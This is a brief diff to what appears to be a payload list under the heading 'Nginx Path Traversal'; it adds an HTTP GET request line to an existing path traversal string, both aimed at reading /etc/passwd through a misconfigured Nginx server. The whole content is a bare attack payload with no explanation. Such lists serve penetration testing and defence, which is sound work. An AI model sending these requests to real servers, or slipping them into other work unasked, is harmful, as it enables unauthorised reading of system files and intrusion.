@@ -6,3 +6,5 @@ Nginx Path Traversal
 
 
 ///////../../../etc/passwd
+
+GET ///////../../../etc/passwd 
